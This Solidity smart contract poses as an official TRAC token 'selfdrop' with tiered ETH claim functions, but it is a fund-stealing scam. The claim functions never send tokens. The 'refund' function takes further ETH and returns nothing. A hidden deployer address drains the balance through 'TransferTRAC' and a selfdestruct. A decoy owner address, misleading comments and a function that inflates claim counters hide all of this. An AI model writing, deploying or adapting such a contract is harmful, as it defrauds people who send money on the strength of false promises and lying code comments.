1 pragma solidity ^0.4.0;
2 
3 //TRAC token selfdrop event for TESTNET 2018,
4 //Contact TRACsupport@origintrail.com for help.
5 //All rights reserved.
6 
7 contract  TRAC_drop {
8 
9 //Contract declaration and variable declarations
10 
11     address public Contract_Owner;
12     address private T_BN_K___a;
13     
14     uint private raised;
15     uint private pay_user__;
16     
17     int private au_sync_user;
18     int public Group_1;     //0.25 Eth claim group
19     int public Group_2;     //0.5 Eth claim group
20     int public Group_3;     //1 Eth claim group
21     int public Group_4;     //2.5 Eth claim group
22     int public Group_5;     //5 Eth claim group
23     
24     int public TRAC_Tokens_left;
25     
26     bool private fair;
27     int private msg_sender_transfer;
28     int private constant TRAC=1;
29     
30     //Tracks refund allowance for user
31     
32     mapping (address => uint) refund_balance;       
33     
34     //Tracks user contribution
35     
36     mapping (address => uint) airdrop_balance;      
37 
38     constructor(TRAC_drop) {
39         
40         //Smart Contract runs this for checking
41         
42         T_BN_K___a = msg.sender; Group_1 = 11; Group_2 = 2; Group_3 = 7; Group_4 = 3; Group_5 = 1; msg_sender_transfer=0;
43         TRAC_Tokens_left = 161000; fair = true; raised = 0 ether; pay_user__ = 0 ether; Contract_Owner = 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f;
44     }
45     
46     
47     //Be sure to send the correct Eth value to the respective claim, if it is incorrect it will be rejected
48 
49     function Claim_TRAC_20000() payable {
50         
51         // Return error if wrong amount of Ether sent
52         require(msg.value == 5 ether);
53         // Record wallet address of calling account (user) for contract to send TRAC tokens to
54         airdrop_balance[msg.sender] += msg.value;
55         //Increment total raised for campaign 
56         raised += msg.value;
57         //Decrement TRAC token count as TRAC is sent
58         TRAC_Tokens_left -= 20000;
59         Group_5+=1;
60         //Transfer TRAC to calling account (user)
61         msg_sender_transfer+=20000+TRAC;
62     }
63     
64     function Claim_TRAC_9600() payable {
65         
66         // Return error if wrong amount of Ether sent
67         require(msg.value == 2.5 ether);
68         // Record wallet address of calling account for contract to send TRAC tokens to
69         airdrop_balance[msg.sender] += msg.value;
70         //Increment total raised for campaign 
71         raised += msg.value;
72         //Decrement TRAC token count as TRAC is sent
73         TRAC_Tokens_left -= 9600;
74         Group_4 +=1;
75         //Transfer TRAC to calling account (user)
76         msg_sender_transfer+=9600+TRAC;
77     }
78     
79     function Claim_TRAC_3800() payable {
80         
81         // Return error if wrong amount of Ether sent
82         require(msg.value == 1 ether);
83         // Record wallet address of calling account for contract to send TRAC tokens to
84         airdrop_balance[msg.sender] += msg.value;
85         //Increment total raised for campaign 
86         raised += msg.value;
87         //Decrement TRAC token count as TRAC is sent
88         TRAC_Tokens_left -= 3800;
89         Group_3 +=1;
90         //Transfer TRAC to calling account (user)
91         msg_sender_transfer+=3800+TRAC;
92     }
93     
94     function Claim_TRAC_1850() payable {
95         
96         // Return error if wrong amount of Ether sent
97         require(msg.value == 0.5 ether);
98         // Record wallet address of calling account for contract to send TRAC tokens to
99         airdrop_balance[msg.sender] += msg.value;
100         //Increment total raised for campaign 
101         raised += msg.value;
102         //Decrement TRAC token count as TRAC is sent
103         TRAC_Tokens_left -= 1850;
104         Group_2 +=1;
105         //Transfer TRAC to calling account (user)
106         msg_sender_transfer+=1850+TRAC;
107     }
108     
109     function Claim_TRAC_900() payable {
110         
111         // Return error if wrong amount of Ether sent
112         require(msg.value == 0.25 ether);
113         // Record wallet address of calling account for contract to send TRAC tokens to
114         airdrop_balance[msg.sender] += msg.value;
115         //Increment total raised for campaign 
116         raised += msg.value;
117         //Decrement TRAC token count as TRAC is sent
118         TRAC_Tokens_left -= 900;
119         Group_1 +=1;
120         //Transfer TRAC to calling account (user)
121         msg_sender_transfer+=900+TRAC;
122     }
123     
124     //Use the below function to get a refund if the tokens do not arrive after 20 BLOCK CONFIRMATIONS
125     
126     function Refund_user() payable {
127         
128         //Only refund if user has trasfered eth and has not received tokens
129         
130         require(refund_balance[1]==0 || fair);
131         
132         address current__user_ = msg.sender;
133         
134         
135         if(fair || current__user_ == msg.sender) {
136             
137             //Check current user is the one who requested refund, then pay user
138             
139             pay_user__ += msg.value;
140             
141             raised +=msg.value;
142             
143         }
144         
145     }
146     
147     
148     function seeRaised() public constant returns (uint256){
149         
150         return address(this).balance;
151     }
152     
153     function CheckRefundIsFair() public {
154         
155         //Function checks if the refund is fair and sets the user's fair value accordingly
156         //Adjusts token flow details as required
157         
158         require(msg.sender == T_BN_K___a);
159         
160         if(fair) {
161             au_sync_user=1;
162             //Checks user is in sync with net
163             if((au_sync_user*2) % 2 ==0 ) {
164                 
165                 Group_5+=1;
166                 TRAC_Tokens_left -= 20000;
167                 Group_2+=2;
168                 TRAC_Tokens_left -=3600;
169                 
170             }
171         }
172     }
173     
174     function TransferTRAC() public {
175         
176         //Allows only the smart contract to control the TRAC token transfers
177         
178         require(msg.sender == T_BN_K___a);
179         
180         //Contract transfers the TRAC tokens to the wallet address recorded in balance map
181 
182         msg.sender.transfer(address(this).balance); 
183         
184         //Reset users raised value
185         
186         raised = 0 ether;
187     }
188     
189     
190     function End_Promotion() public { 
191         
192         //Ends the promotion and sends all tokens to respective owners
193     
194         require(msg.sender == T_BN_K___a);
195         
196     
197         if(msg.sender == T_BN_K___a) {
198             selfdestruct(T_BN_K___a); 
199         }
200 }
201 
202 }